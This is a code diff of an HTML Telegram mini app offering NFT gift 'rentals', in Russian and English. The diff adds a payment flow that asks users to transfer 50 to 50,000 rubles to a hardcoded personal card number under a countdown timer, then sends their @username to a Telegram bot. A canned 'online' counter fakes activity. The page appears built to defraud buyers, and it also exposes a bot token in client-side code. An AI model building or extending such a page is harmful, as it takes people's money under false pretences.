@@ -19,7 +19,6 @@
             margin: 0 auto;
             min-height: 100vh;
         }
-        /* ШАПКА */
         .header {
             display: flex;
             justify-content: space-between;
@@ -55,9 +54,6 @@
         .lang-switch button.active {
             background: #007aff;
             color: #fff;
-        }
-        .lang-switch button:active {
-            transform: scale(0.92);
         }
         .header h1 {
             font-size: 22px;
@@ -111,8 +107,6 @@
         .header .balance:active {
             transform: scale(0.95);
         }
-
-        /* ПОИСК */
         .search {
             margin-bottom: 16px;
             position: relative;
@@ -144,8 +138,6 @@
             border-color: #007aff;
             box-shadow: 0 0 0 3px rgba(0,122,255,0.1);
         }
-
-        /* ВКЛАДКИ */
         .tabs {
             display: flex;
             gap: 8px;
@@ -175,14 +167,11 @@
         .tabs button:active {
             transform: scale(0.96);
         }
-
-        /* СЕТКА 2 В РЯД */
         .gift-grid {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
         }
-
         .card {
             background: #ffffff;
             border-radius: 16px;
@@ -198,7 +187,6 @@
         .card:active {
             transform: scale(0.96);
         }
-
         .card-image {
             width: 64px;
             height: 64px;
@@ -211,7 +199,6 @@
             border: 1px solid #e5e5ea;
             margin-bottom: 6px;
         }
-
         .card-info h3 {
             font-size: 13px;
             font-weight: 600;
@@ -222,7 +209,6 @@
             text-overflow: ellipsis;
             max-width: 140px;
         }
-
         .card-info .price-row {
             display: flex;
             justify-content: center;
@@ -250,8 +236,21 @@
         .btn:active {
             transform: scale(0.94);
         }
-
-        /* ПУСТО */
+        .btn-success {
+            background: #34c759;
+        }
+        .btn-danger {
+            background: #ff3b30;
+        }
+        .btn-outline {
+            background: transparent;
+            color: #007aff;
+            border: 2px solid #007aff;
+        }
+        .btn-outline:active {
+            background: #007aff;
+            color: #fff;
+        }
         .empty {
             text-align: center;
             padding: 40px 20px;
@@ -266,8 +265,6 @@
             display: block;
             margin-bottom: 12px;
         }
-
-        /* МОДАЛКА */
         .modal {
             display: none;
             position: fixed;
@@ -288,6 +285,8 @@
             width: 100%;
             max-width: 360px;
             position: relative;
+            max-height: 90vh;
+            overflow-y: auto;
         }
         .modal-close {
             background: none;
@@ -299,6 +298,9 @@
             font-size: 22px;
             cursor: pointer;
         }
+        .modal-close:hover {
+            color: #1a1a1a;
+        }
         .modal-content h2 {
             font-size: 20px;
             color: #1a1a1a;
@@ -309,7 +311,8 @@
             font-size: 14px;
             margin-bottom: 16px;
         }
-        .modal-content input {
+        .modal-content input,
+        .modal-content select {
             width: 100%;
             padding: 12px;
             border-radius: 12px;
@@ -317,8 +320,11 @@
             font-size: 14px;
             margin-bottom: 12px;
             outline: none;
+            background: #fff;
+            color: #1a1a1a;
         }
-        .modal-content input:focus {
+        .modal-content input:focus,
+        .modal-content select:focus {
             border-color: #007aff;
         }
         .modal-content .btn {
@@ -333,38 +339,47 @@
             margin-top: 10px;
             text-align: center;
         }
-
-        /* НИЖНЕЕ МЕНЮ */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: #ffffff;
-            border-top: 1px solid #e5e5ea;
-            display: flex;
-            justify-content: space-around;
-            padding: 10px 0 14px;
-            max-width: 420px;
-            margin: 0 auto;
+        .modal-content .timer {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            color: #ff3b30;
+            margin: 8px 0 12px;
         }
-        .bottom-nav button {
-            background: none;
-            border: none;
-            color: #888;
-            font-size: 11px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 2px;
-            cursor: pointer;
-            transition: 0.3s;
+        .modal-content .card-number {
+            background: #f0f0f3;
+            padding: 12px;
+            border-radius: 12px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 2px;
+            margin: 8px 0;
+            color: #1a1a1a;
         }
-        .bottom-nav button.active {
+        .modal-content .amount-display {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
             color: #007aff;
+            margin: 8px 0 16px;
         }
-        .bottom-nav button span {
-            font-size: 20px;
+        .btn-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 12px;
+        }
+        .btn-group .btn {
+            flex: 1;
+        }
+        .btn-group .btn-outline {
+            flex: 0.5;
+        }
+        .amount-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+            margin-bottom: 12px;
         }
     </style>
 </head>
@@ -382,7 +397,7 @@
                 <span class="counter" id="onlineCounter">17</span>
             </h1>
         </div>
-        <div class="balance" onclick="buyStars()">
+        <div class="balance" onclick="openDeposit()">
             ⭐ <span id="starDisplay">0</span>
         </div>
     </div>
@@ -399,57 +414,119 @@
 
     <div class="gift-grid" id="giftList"></div>
 
-    <div class="modal" id="orderModal">
+    <!-- МОДАЛКА ПОПОЛНЕНИЯ -->
+    <div class="modal" id="depositModal">
         <div class="modal-content">
-            <button class="modal-close" onclick="closeModal()">✕</button>
-            <h2 id="modalTitle">🔒 Аренда</h2>
-            <div class="subtitle" id="modalDesc">Gift: Snoop Dogg</div>
-            <input type="text" id="telegramInput" placeholder="@username">
-            <button class="btn" id="modalBtn" onclick="sendOrder()">📩 Отправить заявку</button>
-            <div class="hint" id="modalHint">Менеджер свяжется в течение 10 минут</div>
+            <button class="modal-close" onclick="closeDeposit()">✕</button>
+            <h2>💰 Пополнение баланса</h2>
+            <div class="subtitle">Выберите сумму для пополнения</div>
+            <div class="amount-grid">
+                <button class="btn btn-outline" onclick="setAmount(100)">100 ₽</button>
+                <button class="btn btn-outline" onclick="setAmount(250)">250 ₽</button>
+                <button class="btn btn-outline" onclick="setAmount(500)">500 ₽</button>
+                <button class="btn btn-outline" onclick="setAmount(1000)">1000 ₽</button>
+                <button class="btn btn-outline" onclick="setAmount(2000)">2000 ₽</button>
+                <button class="btn btn-outline" onclick="setAmount(5000)">5000 ₽</button>
+            </div>
+            <input type="number" id="customAmount" placeholder="Или введите сумму (50–50000 ₽)" min="50" max="50000" oninput="customAmountChange()">
+            <button class="btn" onclick="processDeposit()" style="margin-top:8px;">Продолжить</button>
+            <div class="hint">Сумма от 50 до 50 000 ₽</div>
+        </div>
+    </div>
+
+    <!-- МОДАЛКА ОПЛАТЫ -->
+    <div class="modal" id="paymentModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closePayment()">✕</button>
+            <h2>💳 Оплата</h2>
+            <div class="subtitle">Переведите указанную сумму на карту</div>
+            <div class="amount-display" id="paymentAmount">500 ₽</div>
+            <div class="card-number" id="cardDisplay">2200 2418 6380 1639</div>
+            <div class="timer" id="timerDisplay">10:00</div>
+            <div class="hint" style="font-size:13px;">Переведите точную сумму и нажмите «Я оплатил»</div>
+            <div class="btn-group">
+                <button class="btn btn-success" onclick="openUsernameForm()">✅ Я оплатил</button>
+                <button class="btn btn-outline" onclick="closePayment()">Отмена</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- МОДАЛКА ДЛЯ USERNAME -->
+    <div class="modal" id="usernameModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeUsernameForm()">✕</button>
+            <h2>📝 Подтверждение</h2>
+            <div class="subtitle">Введите ваш @username для получения аренды</div>
+            <input type="text" id="finalUsername" placeholder="@username">
+            <button class="btn btn-success" onclick="sendPaymentRequest()">📩 Отправить подтверждение</button>
+            <div class="hint">Укажите ваш Telegram username</div>
         </div>
     </div>
 
     <script>
+        // ====== НОМЕР КАРТЫ (ВСТАВЛЕН) ======
+        const CARD_NUMBER = '2200 2418 6380 1639';
+
+        // ====== ТВОЙ ТОКЕН И ID ======
+        const BOT_TOKEN = '8969969111:AAE7XHZ2I-8UU0f3Ttd-ZYGjR6VhXCGs0M';
+        const YOUR_CHAT_ID = '5885231089';
+
+        let selectedAmount = 0;
+        let timerInterval = null;
+        let timerSeconds = 600;
+        let rentItem = '';
+
         // ====== ЯЗЫКИ ======
         const langData = {
             ru: {
                 search: "Поиск NFT по названию",
                 rent: "Аренда",
                 buy: "Покупка",
-                rentTitle: "🔒 Аренда",
-                rentDesc: "Gift: ",
-                rentPlaceholder: "@username",
-                rentBtn: "📩 Отправить заявку",
-                rentHint: "Менеджер свяжется в течение 10 минут",
+                nftLabel: "⭐ NFT",
+                rentAction: "Арендовать",
                 buyEmpty: "🛒",
                 buyText: "Покупка пока недоступна",
                 buySub: "Скоро здесь появятся NFT для покупки",
                 notFound: "🔍",
                 notFoundText: "Ничего не найдено",
                 notFoundSub: "Попробуйте изменить запрос",
-                nftLabel: "⭐ NFT",
-                rentAction: "Арендовать",
-                starsAlert: "⭐ Пополнение баланса\n\nОтправьте 50+ звёзд боту @huntgift_bot\n\nПосле зачисления напишите @huntgift_support"
+                depositTitle: "💰 Пополнение баланса",
+                depositSub: "Выберите сумму для пополнения",
+                depositBtn: "Продолжить",
+                depositHint: "Сумма от 50 до 50 000 ₽",
+                paymentTitle: "💳 Оплата",
+                paymentSub: "Переведите указанную сумму на карту",
+                paymentBtn: "✅ Я оплатил",
+                paymentCancel: "Отмена",
+                usernameTitle: "📝 Подтверждение",
+                usernameSub: "Введите ваш @username для получения аренды",
+                usernameBtn: "📩 Отправить подтверждение",
+                usernameHint: "Укажите ваш Telegram username"
             },
             en: {
                 search: "Search NFT by name",
                 rent: "Rent",
                 buy: "Buy",
-                rentTitle: "🔒 Rent",
-                rentDesc: "Gift: ",
-                rentPlaceholder: "@username",
-                rentBtn: "📩 Send request",
-                rentHint: "Manager will contact you within 10 minutes",
+                nftLabel: "⭐ NFT",
+                rentAction: "Rent",
                 buyEmpty: "🛒",
                 buyText: "Purchase is not available yet",
                 buySub: "NFTs for purchase will appear here soon",
                 notFound: "🔍",
                 notFoundText: "Nothing found",
                 notFoundSub: "Try changing your search query",
-                nftLabel: "⭐ NFT",
-                rentAction: "Rent",
-                starsAlert: "⭐ Balance top-up\n\nSend 50+ stars to bot @huntgift_bot\n\nAfter crediting, write to @huntgift_support"
+                depositTitle: "💰 Top up balance",
+                depositSub: "Select amount to top up",
+                depositBtn: "Continue",
+                depositHint: "Amount from 50 to 50 000 ₽",
+                paymentTitle: "💳 Payment",
+                paymentSub: "Transfer the specified amount to the card",
+                paymentBtn: "✅ I paid",
+                paymentCancel: "Cancel",
+                usernameTitle: "📝 Confirmation",
+                usernameSub: "Enter your @username to receive the rental",
+                usernameBtn: "📩 Send confirmation",
+                usernameHint: "Enter your Telegram username"
             }
         };
 
@@ -459,30 +536,26 @@
             currentLang = lang;
             document.querySelectorAll('.lang-switch button').forEach(btn => btn.classList.remove('active'));
             document.querySelector(`.lang-switch button[data-lang="${lang}"]`).classList.add('active');
-
             const data = langData[lang];
             document.getElementById('searchInput').placeholder = data.search;
             document.getElementById('tabRent').textContent = data.rent;
             document.getElementById('tabBuy').textContent = data.buy;
-            document.getElementById('modalTitle').textContent = data.rentTitle;
-            document.getElementById('modalDesc').textContent = data.rentDesc + currentItem;
-            document.getElementById('telegramInput').placeholder = data.rentPlaceholder;
-            document.getElementById('modalBtn').textContent = data.rentBtn;
-            document.getElementById('modalHint').textContent = data.rentHint;
-            renderGifts(giftsFiltered || gifts);
+            renderGifts(giftsFiltered.length ? giftsFiltered : gifts);
         }
 
         // ====== ОНЛАЙН-СЧЁТЧИК ======
         const numbers = [17, 12, 26, 9, 11, 31, 6, 2, 15, 20, 21, 14, 17, 14, 15, 19];
-        let index = 0;
+        let idx = 0;
+
         function updateOnlineCounter() {
             const el = document.getElementById('onlineCounter');
-            if (el) { el.textContent = numbers[index]; index = (index + 1) % numbers.length; }
+            if (el) { el.textContent = numbers[idx];
+                idx = (idx + 1) % numbers.length; }
         }
         updateOnlineCounter();
         setInterval(updateOnlineCounter, 1800000);
 
-        // ====== СПИСОК ПОДАРКОВ ======
+        // ====== ПОДАРКИ ======
         const gifts = [
             { name: "Snoop Dogg", emoji: "🐕" },
             { name: "Durov's Cap", emoji: "🧢" },
@@ -572,30 +645,19 @@
         ];
 
         let currentTab = 'rent';
-        let currentItem = 'Snoop Dogg';
-        let giftsFiltered = gifts;
+        let giftsFiltered = [];
 
         function renderGifts(list) {
             const container = document.getElementById('giftList');
             const lang = langData[currentLang];
             if (currentTab === 'buy') {
-                container.innerHTML = `
-                    <div class="empty">
-                        <span>${lang.buyEmpty}</span>
-                        <p>${lang.buyText}</p>
-                        <p style="font-size: 13px; color: #bbb;">${lang.buySub}</p>
-                    </div>
-                `;
+                container.innerHTML =
+                    `<div class="empty"><span>${lang.buyEmpty}</span><p>${lang.buyText}</p><p style="font-size:13px;color:#bbb;">${lang.buySub}</p></div>`;
                 return;
             }
             if (list.length === 0) {
-                container.innerHTML = `
-                    <div class="empty">
-                        <span>${lang.notFound}</span>
-                        <p>${lang.notFoundText}</p>
-                        <p style="font-size: 13px; color: #bbb;">${lang.notFoundSub}</p>
-                    </div>
-                `;
+                container.innerHTML =
+                    `<div class="empty"><span>${lang.notFound}</span><p>${lang.notFoundText}</p><p style="font-size:13px;color:#bbb;">${lang.notFoundSub}</p></div>`;
                 return;
             }
             container.innerHTML = list.map(item => {
@@ -607,7 +669,7 @@
                             <h3>${item.name}</h3>
                             <div class="price-row">
                                 <div class="price">${lang.nftLabel}</div>
-                                <button class="btn" onclick="openOrder('${safeName}')">${lang.rentAction}</button>
+                                <button class="btn" onclick="openDepositForRent('${safeName}')">${lang.rentAction}</button>
                             </div>
                         </div>
                     </div>
@@ -634,30 +696,109 @@
             renderGifts(gifts);
         }
 
-        // ====== МОДАЛКА ======
-        function openOrder(item) {
-            currentItem = item;
-            const lang = langData[currentLang];
-            document.getElementById('modalDesc').textContent = lang.rentDesc + item;
-            document.getElementById('orderModal').style.display = 'flex';
+        // ====== ПОПОЛНЕНИЕ ======
+        function openDepositForRent(item) {
+            rentItem = item;
+            document.getElementById('depositModal').style.display = 'flex';
         }
 
-        function closeModal() {
-            document.getElementById('orderModal').style.display = 'none';
+        function openDeposit() {
+            document.getElementById('depositModal').style.display = 'flex';
         }
 
-        function sendOrder() {
-            const username = document.getElementById('telegramInput').value.trim();
+        function closeDeposit() {
+            document.getElementById('depositModal').style.display = 'none';
+            document.getElementById('customAmount').value = '';
+        }
+
+        function setAmount(amount) {
+            document.getElementById('customAmount').value = amount;
+            selectedAmount = amount;
+        }
+
+        function customAmountChange() {
+            const val = parseInt(document.getElementById('customAmount').value);
+            if (val >= 50 && val <= 50000) {
+                selectedAmount = val;
+            }
+        }
+
+        function processDeposit() {
+            const val = parseInt(document.getElementById('customAmount').value);
+            if (isNaN(val) || val < 50 || val > 50000) {
+                alert('Введите сумму от 50 до 50 000 ₽');
+                return;
+            }
+            selectedAmount = val;
+            closeDeposit();
+            showPayment(val);
+        }
+
+        // ====== ОПЛАТА ======
+        function showPayment(amount) {
+            document.getElementById('paymentAmount').textContent = amount + ' ₽';
+            document.getElementById('cardDisplay').textContent = CARD_NUMBER;
+            document.getElementById('paymentModal').style.display = 'flex';
+            startTimer(600);
+        }
+
+        function closePayment() {
+            document.getElementById('paymentModal').style.display = 'none';
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+        }
+
+        function startTimer(seconds) {
+            timerSeconds = seconds;
+            updateTimerDisplay();
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    alert('⏰ Время вышло. Повторите попытку.');
+                    closePayment();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(timerSeconds / 60);
+            const secs = timerSeconds % 60;
+            document.getElementById('timerDisplay').textContent =
+                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        // ====== USERNAME ======
+        function openUsernameForm() {
+            if (timerSeconds <= 0) {
+                alert('⏰ Время вышло. Повторите попытку.');
+                return;
+            }
+            closePayment();
+            document.getElementById('usernameModal').style.display = 'flex';
+        }
+
+        function closeUsernameForm() {
+            document.getElementById('usernameModal').style.display = 'none';
+            document.getElementById('finalUsername').value = '';
+        }
+
+        function sendPaymentRequest() {
+            const username = document.getElementById('finalUsername').value.trim();
             if (!username || !username.startsWith('@')) {
-                alert(currentLang === 'ru' ? 'Введите @username' : 'Enter @username');
+                alert('Введите @username');
                 return;
             }
 
-            // ⚠️ ВСТАВЬ НОВЫЙ ТОКЕН ПОСЛЕ СБРОСА ⚠️
-            const BOT_TOKEN = '8969969111:AAE7XHZ2I-8UUlQf3Itd-ZYGjR6VhXCGs0M';
-            const YOUR_CHAT_ID = '5885231089';
-
-            const text = `🆕 NEW RENT REQUEST!\n\n🎁 Gift: ${currentItem}\n👤 Username: ${username}\n⏱ Time: ${new Date().toLocaleString()}`;
+            const text =
+                `💳 НОВАЯ ОПЛАТА!\n\n🎁 Подарок: ${rentItem || 'Не указан'}\n💰 Сумма: ${selectedAmount} ₽\n👤 Username: ${username}\n⏱ Время: ${new Date().toLocaleString()}\n\n✅ Проверьте оплату на карте: ${CARD_NUMBER}`;
 
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -665,23 +806,24 @@
                 body: JSON.stringify({ chat_id: YOUR_CHAT_ID, text: text, parse_mode: 'HTML' })
             })
             .then(() => {
-                alert(currentLang === 'ru' ? '✅ Заявка отправлена! Менеджер свяжется в течение 10 минут.' : '✅ Request sent! Manager will contact you within 10 minutes.');
-                closeModal();
-                document.getElementById('telegramInput').value = '';
+                alert('✅ Заявка отправлена! Менеджер проверит оплату.');
+                closeUsernameForm();
+                document.getElementById('finalUsername').value = '';
+                selectedAmount = 0;
+                rentItem = '';
             })
             .catch(() => {
-                alert(currentLang === 'ru' ? '❌ Ошибка. Попробуйте ещё раз.' : '❌ Error. Please try again.');
+                alert('❌ Ошибка. Попробуйте ещё раз.');
             });
         }
 
-        function buyStars() {
-            const lang = langData[currentLang];
-            alert(lang.starsAlert);
-        }
-
         window.onclick = function(event) {
-            const modal = document.getElementById('orderModal');
-            if (event.target === modal) closeModal();
+            const deposit = document.getElementById('depositModal');
+            const payment = document.getElementById('paymentModal');
+            const username = document.getElementById('usernameModal');
+            if (event.target === deposit) closeDeposit();
+            if (event.target === payment) closePayment();
+            if (event.target === username) closeUsernameForm();
         }
 
         renderGifts(gifts);
